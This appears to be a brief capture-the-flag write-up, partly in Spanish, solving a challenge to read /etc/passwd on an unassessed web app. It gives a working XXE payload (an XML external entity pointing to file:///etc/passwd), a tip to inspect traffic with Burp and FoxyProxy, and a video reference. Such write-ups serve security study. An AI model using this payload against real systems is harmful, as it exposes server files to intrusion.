The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
## Solución
```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<data> 
	<ID>&xxe;</ID> 
</data>
```

## Notas Adicionales

Revisar con Burp y foxy proxy para revisar vulnerabilidades
## Referencias
https://www.youtube.com/watch?v=b1pGlutUL34&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl